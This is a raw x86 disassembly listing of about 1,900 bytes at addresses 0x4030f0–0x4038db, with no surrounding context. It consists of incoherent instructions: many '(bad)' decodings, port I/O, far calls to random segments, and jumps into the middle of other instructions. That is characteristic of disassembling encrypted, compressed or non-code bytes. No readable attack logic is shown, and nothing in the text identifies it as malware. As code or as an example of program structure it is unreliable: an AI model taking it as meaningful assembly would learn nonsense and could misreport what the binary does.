  4030f0:	fcomp  DWORD PTR [ebx+0xa]
  4030f3:	(bad)  
  4030f5:	fidiv  WORD PTR [edx-0xada2e61]
  4030fb:	sbb    DWORD PTR [edx-0x7102109e],ebx
  403101:	xor    ebx,eax
  403103:	push   0xffffffc2
  403105:	in     eax,0x6f
  403107:	(bad)  
  403108:	rcr    DWORD PTR [edi+eax*2-0x67],1
  40310c:	pop    es
  40310d:	pop    eax
  40310e:	icebp  
  40310f:	or     eax,0x6727f24
  403114:	xchg   ecx,eax
  403115:	sub    eax,0x938f4b92
  40311a:	jmp    0x403199
  40311c:	pop    ecx
  40311d:	adc    BYTE PTR [esi+0x53],dl
  403120:	int3   
  403121:	out    dx,al
  403122:	icebp  
  403123:	add    BYTE PTR [ebx],ch
  403125:	adc    DWORD PTR ds:0x9e34c2dc,edx
  40312b:	mov    bh,0x4d
  40312d:	mov    eax,ds:0x22b0be62
  403132:	push   edi
  403133:	mov    edx,0xcd0b165
  403138:	adc    eax,0x1df1451e
  40313d:	imul   DWORD PTR [ebx]
  40313f:	fcom   DWORD PTR [ecx+0x35]
  403142:	inc    eax
  403143:	sub    BYTE PTR [eax],ah
  403145:	dec    esi
  403146:	pop    edi
  403147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403148:	add    al,0xc9
  40314a:	sbb    DWORD PTR [edx+0x6e123142],edi
  403150:	inc    esi
  403151:	rcr    BYTE PTR [ebx],1
  403153:	xor    edx,DWORD PTR [ebx-0x22]
  403156:	jl     0x40311e
  403158:	cli    
  403159:	mov    eax,0x2765af1
  40315e:	or     ebp,DWORD PTR [edi+edi*1+0x6d]
  403162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403163:	push   ecx
  403164:	xchg   esp,eax
  403165:	jns    0x403186
  403167:	xchg   edi,eax
  403168:	test   BYTE PTR es:[edx+0x28ca78f6],dh
  40316f:	jno    0x4030f3
  403171:	test   cl,ch
  403173:	arpl   WORD PTR [edx+0x3e],dx
  403176:	inc    edx
  403177:	ja     0x403148
  403179:	push   ss
  40317a:	call   0xa144:0x61a9acc1
  403181:	inc    esp
  403182:	or     al,0xf7
  403184:	in     al,0x11
  403186:	jne    0x4031e4
  403188:	mov    ch,0x12
  40318a:	mov    DWORD PTR [eax],edi
  40318c:	cmp    BYTE PTR [ecx],ah
  40318e:	mov    BYTE PTR [edi+0x4d],bl
  403191:	jecxz  0x4031fa
  403193:	(bad)
  403196:	test   eax,0x9abd17e5
  40319b:	aas    
  40319c:	sub    cl,al
  40319e:	sub    eax,0x8a71f275
  4031a3:	dec    ebx
  4031a4:	and    DWORD PTR [eax],eax
  4031a6:	enter  0xe2bc,0x80
  4031aa:	mov    ah,0xbb
  4031ac:	mov    bl,0xdf
  4031ae:	test   ah,dh
  4031b0:	pop    edx
  4031b1:	mov    eax,ds:0x299da2c7
  4031b6:	push   ebx
  4031b7:	sbb    dl,BYTE PTR [edi+ebx*1]
  4031ba:	mov    ecx,0x4caa0b31
  4031bf:	jl     0x4031f9
  4031c1:	sahf   
  4031c2:	or     esi,DWORD PTR [esi+0x71e266cb]
  4031c8:	add    ebx,eax
  4031ca:	fcmovnb st,st(7)
  4031cc:	nop
  4031cd:	fcmovnbe st,st(3)
  4031cf:	inc    eax
  4031d0:	mov    ch,0xe2
  4031d2:	les    ebp,FWORD PTR [esi+0x2db46129]
  4031d8:	adc    eax,0xbce4c94a
  4031dd:	cmp    eax,0x519f8ac7
  4031e2:	jmp    0x4031d0
  4031e4:	das    
  4031e5:	adc    al,0x7e
  4031e7:	je     0x403252
  4031e9:	adc    DWORD PTR [edi-0x41],esi
  4031ec:	gs inc edi
  4031ee:	cmp    al,0xec
  4031f0:	xchg   esp,eax
  4031f1:	test   cl,ch
  4031f3:	ins    DWORD PTR es:[edi],dx
  4031f4:	and    esp,DWORD PTR [ebx]
  4031f6:	out    dx,eax
  4031f7:	add    esp,DWORD PTR [ecx]
  4031f9:	dec    ebx
  4031fa:	adc    DWORD PTR [edx+0x13fcc718],edi
  403200:	jge    0x40322c
  403202:	inc    esi
  403203:	sbb    ch,BYTE PTR [edi+0x9]
  403206:	jle    0x4031a5
  403208:	inc    edi
  403209:	imul   eax,DWORD PTR [esi+0x3e3872cd],0x40
  403210:	div    al
  403212:	icebp  
  403213:	aad    0xc0
  403215:	xchg   esi,eax
  403216:	bound  edi,QWORD PTR ds:0xac09417d
  40321c:	mov    esi,0xf9a2b295
  403221:	sbb    DWORD PTR [ecx+0x159dac1b],esp
  403227:	out    0x1d,eax
  403229:	ret    
  40322a:	in     eax,0xae
  40322c:	mov    ebp,DWORD PTR [ebx-0x2]
  40322f:	outs   dx,DWORD PTR ds:[esi]
  403230:	xchg   ebx,eax
  403231:	xor    edi,DWORD PTR [ebp+0x4a]
  403234:	mov    ds:0xb0602a71,al
  403239:	ss dec esi
  40323b:	and    al,0xae
  40323d:	out    dx,eax
  40323e:	pusha  
  40323f:	call   0xb0d0:0x391e4f3b
  403246:	lock inc eax
  403248:	add    DWORD PTR [eax-0x73],esi
  40324b:	inc    ebx
  40324c:	add    al,0x8a
  40324e:	call   0x4451732e
  403253:	dec    esi
  403254:	and    BYTE PTR [edx-0x1f2d6b0e],0xbf
  40325b:	cwde   
  40325c:	or     eax,0x5a524ecc
  403261:	pop    esp
  403262:	sub    dh,BYTE PTR [ebx-0x7d]
  403265:	xor    edi,ebp
  403267:	push   esi
  403268:	jns    0x403268
  40326a:	sahf   
  40326b:	test   dh,bh
  40326d:	inc    ebp
  40326e:	fbld   TBYTE PTR [ecx+0x281535b5]
  403274:	push   si
  403276:	and    DWORD PTR [esi+0x2a791118],esp
  40327c:	mov    DWORD PTR [esi-0x1e443b07],eax
  403282:	mov    esp,0x628f76d3
  403287:	push   0x6c49238e
  40328c:	jae    0x403295
  40328e:	pop    es
  40328f:	clc    
  403290:	outs   dx,DWORD PTR ds:[esi]
  403291:	loope  0x40322f
  403293:	and    BYTE PTR [ebp-0x3f05247e],0x7f
  40329a:	jo     0x4032ad
  40329c:	fdivr  st,st(7)
  40329e:	and    eax,0x9511ec28
  4032a3:	or     al,0x4e
  4032a5:	xor    BYTE PTR [edx+ecx*1-0x6],bl
  4032a9:	xor    bh,ch
  4032ab:	loope  0x4032c9
  4032ad:	or     BYTE PTR [eax-0x330a0886],bh
  4032b3:	mov    bl,BYTE PTR [ebx]
  4032b5:	stc    
  4032b6:	retf   
  4032b7:	rcl    ch,cl
  4032b9:	pop    edi
  4032ba:	fmul   QWORD PTR [eax+0xe]
  4032bd:	xchg   ebx,eax
  4032be:	shl    BYTE PTR [edx],1
  4032c0:	(bad)  
  4032c1:	scas   al,BYTE PTR es:[edi]
  4032c2:	pusha  
  4032c3:	xlat   BYTE PTR ds:[ebx]
  4032c4:	imul   ecx,esi,0x6e5bacfb
  4032ca:	inc    edx
  4032cb:	adc    al,0xef
  4032cd:	jg     0x4032e2
  4032cf:	xor    eax,ebx
  4032d1:	sti    
  4032d2:	add    BYTE PTR [edx+edx*8],bh
  4032d5:	mov    bh,0xc8
  4032d7:	xchg   ecx,edi
  4032d9:	pusha  
  4032da:	mov    bh,0x26
  4032dc:	push   ss
  4032dd:	test   al,0xa
  4032df:	fstp   TBYTE PTR [edx+0x5a]
  4032e2:	int    0xf9
  4032e4:	into   
  4032e5:	mov    esp,0x10addfce
  4032ea:	push   0xffffffab
  4032ec:	jb     0x403303
  4032ee:	outs   dx,DWORD PTR ds:[esi]
  4032ef:	sbb    al,0x37
  4032f1:	mov    ch,0x58
  4032f3:	xchg   ebx,eax
  4032f4:	dec    edx
  4032f5:	mov    ah,dh
  4032f7:	jmp    0x40330c
  4032f9:	xor    eax,0x8788695a
  4032fe:	shl    BYTE PTR [edi],cl
  403300:	jecxz  0x4032d4
  403302:	(bad)  
  403304:	arpl   WORD PTR [ebp+0x66],sp
  403307:	cmp    DWORD PTR [edx+0x4f],eax
  40330a:	mov    ebx,0x91efc940
  40330f:	cmc    
  403310:	mov    dh,0x5a
  403312:	js     0x4032f5
  403314:	jno    0x40336e
  403316:	lds    ebx,FWORD PTR [esp+edx*4-0x4209d014]
  40331d:	mov    al,BYTE PTR [edx-0x3e]
  403320:	fmul   st(7),st
  403322:	(bad)  [ecx]
  403324:	hlt    
  403325:	je     0x403397
  403327:	inc    ebp
  403328:	pop    esp
  403329:	in     al,0x3a
  40332b:	mov    ebx,0x51055694
  403330:	ins    BYTE PTR es:[edi],dx
  403331:	dec    eax
  403332:	pop    edi
  403333:	mov    bh,0x6e
  403335:	outs   dx,DWORD PTR ds:[esi]
  403336:	xchg   esi,eax
  403337:	jnp    0x4032eb
  403339:	push   cs
  40333a:	int    0x36
  40333c:	xchg   esi,eax
  40333d:	or     esi,eax
  40333f:	jbe    0x4032d2
  403341:	mov    ecx,0x4187dc1b
  403346:	fisttp QWORD PTR [eax+0x29]
  403349:	or     dh,dh
  40334b:	aam    0x3e
  40334d:	cmp    DWORD PTR [esi+ecx*8+0x297ade27],eax
  403354:	fnstenv [edx]
  403356:	sbb    eax,0x8e2e7dc2
  40335b:	pop    es
  40335c:	push   esp
  40335d:	jge    0x403303
  40335f:	les    esi,FWORD PTR [ebp+eiz*1+0x74]
  403363:	pop    es
  403364:	inc    edi
  403365:	sbb    al,0x57
  403367:	or     ecx,DWORD PTR [eax-0x4a43f70e]
  40336d:	add    al,0x4d
  40336f:	scas   al,BYTE PTR es:[edi]
  403370:	dec    edx
  403371:	xchg   esp,eax
  403372:	sub    bh,BYTE PTR [ebp-0x34]
  403375:	cmp    DWORD PTR [edi+0x7b914a27],eax
  40337b:	je     0x4033e5
  40337d:	jb     0x40338d
  40337f:	sbb    esi,DWORD PTR [esi]
  403381:	add    al,0x12
  403383:	mov    eax,ds:0x57f89224
  403388:	mov    esp,0x98ed8282
  40338d:	jne    0x4033ad
  40338f:	push   0xd69aab88
  403394:	outs   dx,DWORD PTR ds:[esi]
  403395:	repz gs pop ds
  403398:	pop    eax
  403399:	and    esi,DWORD PTR [ebp-0x750fa32e]
  40339f:	xor    eax,0x62a7d31a
  4033a4:	pop    esi
  4033a5:	int3   
  4033a6:	push   edx
  4033a7:	shl    esp,0x47
  4033aa:	jns    0x40332d
  4033ac:	pop    ecx
  4033ad:	mov    ?,WORD PTR [edi]
  4033af:	mov    bh,0x59
  4033b1:	pop    ss
  4033b2:	inc    edi
  4033b3:	push   ebx
  4033b4:	dec    ebp
  4033b5:	retf   
  4033b6:	daa    
  4033b7:	jnp    0x40339b
  4033b9:	fisttp QWORD PTR [esi-0x6cdc2e17]
  4033bf:	inc    ebp
  4033c0:	xchg   ebp,eax
  4033c1:	sti    
  4033c2:	sub    DWORD PTR [edx+0x65274d0f],edi
  4033c8:	leave  
  4033c9:	cmp    DWORD PTR [esp+edx*1-0x2c57451b],ecx
  4033d0:	mov    ch,0xaf
  4033d2:	(bad)  
  4033d5:	dec    esi
  4033d6:	jbe    0x40340c
  4033d8:	rcr    BYTE PTR [ebx-0x6d],1
  4033db:	and    BYTE PTR [ecx-0xa],dh
  4033de:	jae    0x403361
  4033e0:	xchg   ebx,eax
  4033e1:	mov    ds:0x3d39bcbf,al
  4033e6:	jecxz  0x40344e
  4033e8:	mov    ecx,0x1c54f2d6
  4033ed:	loopne 0x403394
  4033ef:	js     0x403450
  4033f1:	adc    DWORD PTR [ebx-0x12],0x26f9d99f
  4033f8:	lds    ebx,FWORD PTR [ebx+0x53d735ae]
  4033fe:	cmp    DWORD PTR [eax],ebp
  403400:	aad    0x39
  403402:	lahf   
  403403:	mov    ecx,0x680b812a
  403408:	cmp    ch,BYTE PTR [ecx+0x7cf90049]
  40340e:	adc    al,al
  403410:	call   0xdee7d350
  403415:	es and al,0xb5
  403418:	dec    esp
  403419:	sbb    BYTE PTR [ebx-0x3e],cl
  40341c:	je     0x403497
  40341e:	mov    DWORD PTR [edx-0x7e8eb03b],esp
  403424:	fidivr DWORD PTR [edx-0x4620c536]
  40342a:	jecxz  0x403496
  40342c:	jecxz  0x40340d
  40342e:	cli    
  40342f:	gs jp  0x4033ca
  403432:	pop    ss
  403433:	rol    DWORD PTR [esi],1
  403435:	adc    BYTE PTR [edi-0x45],dl
  403438:	push   ds
  403439:	xor    al,0x4e
  40343b:	test   BYTE PTR [ebx+0x50],dh
  40343e:	push   ebp
  40343f:	pop    ebx
  403440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403441:	dec    eax
  403442:	dec    ebx
  403444:	sti    
  403445:	push   0x687bb40f
  40344a:	mov    al,ds:0x5852de4e
  40344f:	mov    ah,0xfd
  403451:	push   0xd61e4473
  403456:	shr    edx,1
  403458:	xor    esi,DWORD PTR [esi+0x12]
  40345b:	fild   DWORD PTR [esi+0x1b]
  40345e:	popf   
  40345f:	mov    bh,0x4
  403461:	and    DWORD PTR ss:[edi+ebp*1-0x62],ecx
  403466:	lods   eax,DWORD PTR ds:[esi]
  403467:	xor    DWORD PTR [edi-0x71],ebx
  40346a:	pop    ecx
  40346b:	imul   DWORD PTR [ebx-0x4b]
  40346e:	(bad)  
  40346f:	cld    
  403470:	pop    eax
  403471:	loope  0x4034cb
  403473:	int    0x91
  403475:	xchg   DWORD PTR [edi],edi
  403477:	push   0x72
  403479:	inc    esp
  40347a:	test   eax,0xe1e572f0
  40347f:	int3   
  403480:	adc    ebp,DWORD PTR [esp+edx*1-0x6c3266f4]
  403487:	jg     0x40347f
  403489:	xchg   esi,eax
  40348a:	les    esi,FWORD PTR [ecx-0x64b3dbde]
  403490:	shr    ebp,cl
  403492:	out    dx,al
  403493:	jns    0x403465
  403495:	xchg   ebp,eax
  403496:	dec    ecx
  403497:	jecxz  0x403494
  403499:	ficomp WORD PTR [edx-0x24]
  40349c:	imul   esp,edi,0xffffff9a
  40349f:	or     ebp,ebx
  4034a1:	add    BYTE PTR [esi-0x3ac63723],cl
  4034a7:	sbb    eax,0x7d638666
  4034ac:	mov    bl,0x6f
  4034ae:	xchg   ecx,eax
  4034af:	sub    edx,DWORD PTR [edi-0x22]
  4034b2:	and    BYTE PTR [edi+edx*1],dh
  4034b5:	in     eax,0xcd
  4034b7:	shr    BYTE PTR ds:0x5fb760b,1
  4034bd:	ret    
  4034be:	sbb    eax,0x5e482eb0
  4034c3:	lock adc DWORD PTR [ebx],eax
  4034c6:	or     eax,0x409a98c8
  4034cb:	dec    ebx
  4034cc:	int3   
  4034cd:	out    dx,eax
  4034ce:	imul   dl
  4034d0:	jne    0x4034fb
  4034d2:	js     0x4034cf
  4034d4:	retf   
  4034d5:	inc    ebx
  4034d6:	pop    edx
  4034d7:	dec    eax
  4034d8:	mov    ebx,0x9de8714e
  4034dd:	mov    bl,0xa8
  4034df:	not    BYTE PTR [ebx-0x7f6fb2d2]
  4034e5:	(bad)  
  4034e6:	cld    
  4034e7:	call   0xf55c:0xdb2724c3
  4034ee:	mov    cl,0x75
  4034f0:	cmp    esi,DWORD PTR [edx-0x50]
  4034f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034f4:	push   ecx
  4034f5:	sub    eax,0x8fe414e
  4034fa:	mov    dh,0x39
  4034fc:	sbb    DWORD PTR [esi+ecx*8],0xbd071fbf
  403503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403504:	std    
  403505:	cdq    
  403506:	ss not esp
  403509:	(bad)  
  40350a:	cmp    eax,0x946e6d4b
  40350f:	les    edi,FWORD PTR [edx+0x46]
  403512:	push   edx
  403513:	scas   al,BYTE PTR es:[edi]
  403514:	add    eax,0xb77819ea
  403519:	sbb    eax,0x9cb1358a
  40351e:	lods   al,BYTE PTR ds:[esi]
  40351f:	ja     0x40352c
  403521:	jl     0x4034c7
  403523:	popf   
  403524:	sbb    bl,bl
  403526:	sub    eax,0x70254388
  40352b:	ss call 0x339e:0x8d537a6f
  403533:	inc    ebp
  403534:	fild   WORD PTR [ebp-0x11dc686d]
  40353a:	popa   
  40353b:	ss xor al,0x76
  40353e:	scas   eax,DWORD PTR es:[edi]
  40353f:	dec    eax
  403540:	(bad)  [ebp+0x5c]
  403543:	mov    DWORD PTR [edi+0x33],eax
  403546:	mov    dh,0x8b
  403548:	icebp  
  403549:	test   al,0xf9
  40354b:	dec    ebp
  40354c:	push   ss
  40354d:	xlat   BYTE PTR ds:[ebx]
  40354e:	les    edi,FWORD PTR [ebp+0x53]
  403551:	es out 0x18,eax
  403554:	mov    dh,0x31
  403556:	stc    
  403557:	mov    ecx,0xf731426a
  40355c:	fisttp QWORD PTR [eax+0x34]
  40355f:	cld    
  403560:	loop   0x4035c9
  403562:	inc    edx
  403563:	sub    DWORD PTR [edx+0x49],esi
  403566:	fst    QWORD PTR [edi-0x78]
  403569:	dec    ebp
  40356a:	fisub  DWORD PTR [edx]
  40356c:	xor    eax,0x31ec0ed7
  403571:	pop    ss
  403572:	sbb    DWORD PTR [edx-0x42],0xea529591
  403579:	stos   BYTE PTR es:[edi],al
  40357a:	shl    BYTE PTR [esp+esi*8+0x6d],cl
  40357e:	enter  0x7989,0xda
  403582:	ds inc eax
  403584:	pop    eax
  403585:	sub    eax,0xd846dc99
  40358a:	jno    0x4035c1
  40358c:	sbb    DWORD PTR ds:0x8565af2,esi
  403592:	(bad)
  403596:	sub    BYTE PTR [ecx+0x15],bh
  403599:	push   es
  40359a:	adc    al,0xdb
  40359c:	add    ecx,esp
  40359e:	in     al,0xc4
  4035a0:	sti    
  4035a1:	aas    
  4035a2:	sbb    al,0xfe
  4035a4:	bound  esp,QWORD PTR [ebx]
  4035a6:	sub    edx,esp
  4035a8:	inc    ebp
  4035a9:	shr    BYTE PTR [eax+0x59],0xe5
  4035ad:	pop    esp
  4035ae:	add    DWORD PTR [eax-0x17],esp
  4035b1:	ins    BYTE PTR es:[edi],dx
  4035b2:	int3   
  4035b3:	push   esp
  4035b4:	add    DWORD PTR [esi+edi*1+0x2d234404],edx
  4035bb:	mov    eax,0xe6aad9a9
  4035c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035c1:	push   0xa9e9c7ef
  4035c6:	sub    bl,BYTE PTR [ecx]
  4035c8:	popf   
  4035c9:	and    DWORD PTR [eax-0x5b9b5e32],0x83f4f346
  4035d3:	xlat   BYTE PTR ds:[ebx]
  4035d4:	sub    cl,BYTE PTR [esi]
  4035d6:	mov    ch,0xcb
  4035d8:	or     BYTE PTR [ecx],ch
  4035da:	push   ebx
  4035db:	sbb    dl,BYTE PTR [ecx-0x7f]
  4035de:	add    eax,0x91bc5c36
  4035e3:	aad    0xe2
  4035e5:	jae    0x403634
  4035e7:	loopne 0x4035a9
  4035e9:	dec    edx
  4035ea:	add    ch,BYTE PTR [ecx-0x567b810f]
  4035f0:	daa    
  4035f1:	push   edx
  4035f2:	and    DWORD PTR [eax+0x499c8b26],edi
  4035f8:	mov    al,gs:0xef1b1f0f
  4035fe:	(bad)  
  4035ff:	or     DWORD PTR [ecx-0x76],edi
  403602:	pop    ebp
  403603:	sub    esp,DWORD PTR [esi-0x6e]
  403606:	imul   edi,DWORD PTR [ebp-0x34ea5d38],0xe07526da
  403610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403611:	shl    BYTE PTR [ecx+ebp*4],cl
  403614:	and    BYTE PTR [edi+0x20],ah
  403617:	jnp    0x403653
  403619:	aas    
  40361a:	sbb    eax,0xa7bd446d
  40361f:	xchg   esp,eax
  403620:	jge    0x4035ed
  403622:	push   edx
  403623:	or     ah,BYTE PTR [ebp-0xf8a38f7]
  403629:	sub    ch,ch
  40362b:	cdq    
  40362c:	sbb    BYTE PTR [ebp-0x76],dl
  40362f:	mov    edx,DWORD PTR [esi-0xd5fca48]
  403635:	aam    0x3f
  403637:	jbe    0x40363a
  403639:	jl     0x4036aa
  40363b:	xchg   edi,eax
  40363c:	loop   0x40365f
  40363e:	aas    
  40363f:	loop   0x40368d
  403641:	or     al,0x1a
  403643:	inc    al
  403645:	sbb    ecx,DWORD PTR [ecx+0x42f06ee7]
  40364b:	sub    esp,DWORD PTR [ebp+eiz*8-0x533cad50]
  403652:	sbb    DWORD PTR [esp+eax*1-0x6a],ebx
  403656:	pop    DWORD PTR [ebx-0x3b]
  403659:	mov    esp,0xd7e6ac13
  40365e:	and    eax,0xad81b9e0
  403663:	mov    bl,0xb3
  403665:	adc    eax,0x18d8b133
  40366a:	sbb    eax,0x7b38e815
  40366f:	xor    bl,al
  403671:	scas   eax,DWORD PTR es:[edi]
  403672:	js     0x40361c
  403674:	and    esi,0x2d296543
  40367a:	dec    esi
  40367b:	clc    
  40367c:	not    DWORD PTR [ebx+0x22]
  40367f:	daa    
  403680:	sbb    BYTE PTR [edi+0x381d658f],bh
  403686:	fnstsw WORD PTR ss:[ebp+0x45b9437b]
  40368d:	retf   0xb3e
  403690:	mov    WORD PTR [ebx+0x428d5136],gs
  403696:	xor    al,0xd2
  403698:	les    ecx,FWORD PTR [edx+0x76113f80]
  40369e:	push   edi
  40369f:	cdq    
  4036a0:	mov    ah,0xda
  4036a2:	shr    DWORD PTR [edi],cl
  4036a4:	test   bh,dh
  4036a6:	ror    ah,1
  4036a8:	xchg   ecx,eax
  4036a9:	push   esi
  4036aa:	fcomp  DWORD PTR [ebx]
  4036ac:	out    0x4a,eax
  4036ae:	pop    esp
  4036af:	out    dx,eax
  4036b0:	xchg   edi,eax
  4036b1:	repnz add bl,BYTE PTR [ebx+0x7a]
  4036b5:	sbb    bh,dh
  4036b7:	xchg   esp,eax
  4036b8:	dec    ebp
  4036b9:	retf   0xc753
  4036bc:	les    ebp,FWORD PTR [esi-0x47]
  4036bf:	in     eax,dx
  4036c0:	mov    esi,0x2f026e15
  4036c5:	push   ds
  4036c6:	ja     0x403675
  4036c8:	add    DWORD PTR [edx],ebp
  4036ca:	sbb    BYTE PTR [ebp+eiz*4+0x1a0245a7],bl
  4036d1:	push   esp
  4036d2:	and    eax,0x2c079d7
  4036d7:	jl     0x4036a0
  4036d9:	push   ecx
  4036da:	daa    
  4036db:	ja     0x40371f
  4036dd:	ds xchg ebx,eax
  4036df:	mov    esp,0x4a4cafc9
  4036e4:	sbb    DWORD PTR ds:0xfb64561d,0xffffffc5
  4036eb:	mov    WORD PTR [esi+ebx*1+0x5d],?
  4036ef:	xchg   ebp,eax
  4036f0:	pop    ebp
  4036f1:	inc    eax
  4036f2:	xlat   BYTE PTR ds:[ebx]
  4036f3:	nop
  4036f4:	pop    ebp
  4036f5:	fild   QWORD PTR [eax-0x6a]
  4036f8:	fcomp  QWORD PTR [esi]
  4036fa:	in     eax,0x67
  4036fc:	js     0x4036fd
  4036fe:	xchg   esi,eax
  4036ff:	in     al,dx
  403700:	jb     0x4036b3
  403702:	mov    eax,ds:0x17ec8ba
  403707:	retf   
  403708:	outs   dx,DWORD PTR ds:[esi]
  403709:	sub    BYTE PTR [ecx-0x7],cl
  40370c:	add    al,0xee
  40370e:	in     al,0x17
  403710:	adc    DWORD PTR gs:[eax+0x62],ebp
  403714:	mov    ebp,ecx
  403716:	int    0x8b
  403718:	jle    0x403713
  40371a:	sub    al,BYTE PTR [ebp+0x7cb08c7]
  403720:	in     eax,0xc3
  403722:	and    eax,0xda607d0f
  403727:	je     0x403794
  403729:	xchg   ebp,eax
  40372a:	adc    DWORD PTR [esi],ebx
  40372c:	mov    dl,0x3
  40372e:	stc    
  40372f:	popf   
  403730:	cmp    BYTE PTR [ecx],al
  403732:	into   
  403733:	sub    al,0xe9
  403735:	pop    eax
  403736:	(bad)  
  403737:	es mov BYTE PTR es:[ecx-0x1410f728],bl
  40373f:	add    al,0x9d
  403741:	dec    eax
  403742:	jae    0x40373e
  403744:	mov    eax,ds:0xa47c7cb9
  403749:	pop    es
  40374a:	lods   eax,DWORD PTR ds:[esi]
  40374b:	cmp    bl,ch
  40374d:	push   0x8fbb1fe4
  403752:	adc    edx,DWORD PTR [edi-0x514dcbc8]
  403758:	out    0xdf,eax
  40375a:	call   0xf9b3:0x20d90e74
  403761:	mov    dh,0x42
  403763:	gs xor eax,0x62929b86
  403769:	pop    ebx
  40376a:	stos   BYTE PTR es:[edi],al
  40376b:	in     eax,0xa2
  40376d:	adc    eax,0xdb71b875
  403772:	xchg   edi,eax
  403773:	mov    ebp,0x83e4af64
  403778:	in     al,0xf
  40377a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40377c:	test   eax,0x654bf4c7
  403781:	dec    ecx
  403782:	mov    DWORD PTR [ecx+0x4a727d9a],ebx
  403788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403789:	and    eax,0x69df807e
  40378e:	or     edx,DWORD PTR [edx+0x13f3cdd0]
  403794:	jl     0x40373b
  403796:	mov    bh,0xe6
  403798:	sub    eax,0x5fd872d1
  40379d:	cs je  0x403748
  4037a0:	icebp  
  4037a1:	in     al,dx
  4037a2:	mov    ds:0x948b6423,al
  4037a7:	and    cl,BYTE PTR [eax]
  4037a9:	mov    WORD PTR [edi],ss
  4037ab:	repz cwde 
  4037ad:	dec    ebp
  4037ae:	aas    
  4037af:	cmp    DWORD PTR [edi+ecx*4-0x58],edx
  4037b3:	int    0x84
  4037b5:	hlt    
  4037b6:	jecxz  0x403782
  4037b8:	mov    al,0x68
  4037ba:	jp     0x4037c9
  4037bc:	out    0xc3,al
  4037be:	mov    eax,0x1631aff
  4037c3:	mov    cs,WORD PTR [ebp+0x13285ace]
  4037c9:	fsub   st,st(2)
  4037cb:	add    ch,al
  4037cd:	xor    al,0x7f
  4037cf:	ins    BYTE PTR es:[edi],dx
  4037d0:	test   ecx,ebp
  4037d2:	jb     0x403816
  4037d4:	add    al,0x44
  4037d6:	dec    ebx
  4037d7:	mov    bl,0x5a
  4037d9:	jl     0x4037f3
  4037db:	xor    eax,0xd0e8ed99
  4037e0:	xor    ebx,DWORD PTR ds:0x427647ea
  4037e6:	repnz into 
  4037e8:	mov    ds:0x2d54f3e5,al
  4037ed:	mov    bh,0xc5
  4037ef:	mov    al,0x8a
  4037f1:	dec    eax
  4037f2:	out    0xa8,eax
  4037f4:	add    esp,ebx
  4037f6:	cmp    BYTE PTR [edx+0x1429b91c],bh
  4037fc:	fimul  WORD PTR [eax+ebx*2]
  4037ff:	ret    
  403800:	xchg   DWORD PTR [edi-0x2b],esp
  403803:	(bad)  
  403804:	cdq    
  403805:	cmp    eax,0x6eb8feb7
  40380a:	adc    eax,0xee221e44
  40380f:	mov    ds:0x5310c6da,al
  403814:	mov    cl,0x9f
  403816:	aad    0x6d
  403818:	mov    edi,fs
  40381a:	test   BYTE PTR [ebx-0x614d1083],al
  403820:	scas   al,BYTE PTR es:[edi]
  403821:	mov    bl,0xe9
  403823:	adc    BYTE PTR [eax+eiz*4],bh
  403826:	adc    BYTE PTR [esi],ch
  403828:	cmp    DWORD PTR [ecx-0x9e38a41],0xffffff99
  40382f:	sbb    dl,BYTE PTR [edx]
  403831:	in     eax,dx
  403832:	xchg   edx,eax
  403833:	les    ebx,FWORD PTR ds:[edx+0x4b]
  403837:	aad    0xaf
  403839:	xchg   ebp,eax
  40383a:	cmp    cl,BYTE PTR [edx-0x3090804f]
  403840:	mov    dh,0xe1
  403842:	fsub   DWORD PTR [edx+0x35b55ae6]
  403848:	lods   al,BYTE PTR ds:[esi]
  403849:	sti    
  40384a:	in     al,dx
  40384b:	and    BYTE PTR [ebx+0x42],0x6e
  40384f:	data16 jge 0x403869
  403852:	mov    ds:0xef13132c,eax
  403857:	sar    esi,1
  403859:	iret   
  40385a:	add    edx,esi
  40385c:	jp     0x40384e
  40385e:	lahf   
  40385f:	and    dl,BYTE PTR [ecx-0xa]
  403862:	or     BYTE PTR [eax-0x37],ah
  403865:	jne    0x403866
  403867:	cmp    eax,0xdc02aed9
  40386c:	ja     0x4037f2
  40386e:	int    0xbe
  403870:	mov    bl,0xac
  403872:	cld    
  403873:	xchg   esp,eax
  403874:	leave  
  403875:	frstor [ebx-0x47]
  403878:	sub    al,0x98
  40387a:	in     eax,dx
  40387b:	iret   
  40387c:	(bad)  
  40387d:	dec    edi
  40387e:	mov    gs:0xc4a13c54,al
  403884:	mov    esp,gs
  403886:	test   eax,0x77b64baf
  40388b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40388c:	push   ebx
  40388d:	sub    bl,BYTE PTR [edx-0x8d60079]
  403893:	push   ds
  403894:	pop    edi
  403895:	cmc    
  403896:	loope  0x4038ae
  403898:	scas   al,BYTE PTR es:[edi]
  403899:	mov    edx,ebx
  40389b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40389c:	or     BYTE PTR [eax-0x2a],al
  40389f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038a0:	push   ss
  4038a1:	call   0x1c1f24dd
  4038a6:	xor    edx,DWORD PTR [edx-0x15]
  4038a9:	(bad)  
  4038aa:	cdq    
  4038ab:	in     eax,0x21
  4038ad:	sbb    edx,0x96807a94
  4038b3:	in     eax,0x1a
  4038b5:	mov    bh,0x43
  4038b7:	clc    
  4038b8:	stos   DWORD PTR es:[edi],eax
  4038b9:	mov    ebp,0xcabd3acb
  4038be:	pop    DWORD PTR [ebx]
  4038c0:	mov    ah,BYTE PTR [esi+0x14b6ebeb]
  4038c6:	lahf   
  4038c7:	(bad)  
  4038c8:	xor    ecx,DWORD PTR [ebx]
  4038ca:	pop    edi
  4038cb:	(bad)  
  4038cc:	lods   al,BYTE PTR ds:[esi]
  4038cd:	xchg   ebp,eax
  4038ce:	seto   BYTE PTR [esi+0x47]
  4038d2:	scas   al,BYTE PTR es:[edi]
  4038d3:	imul   BYTE PTR [eax-0x39]
  4038d6:	repnz nop
  4038d8:	jecxz  0x403870
  4038da:	dec    esi
  4038db:	fldenv [ebx+0x5664b197]
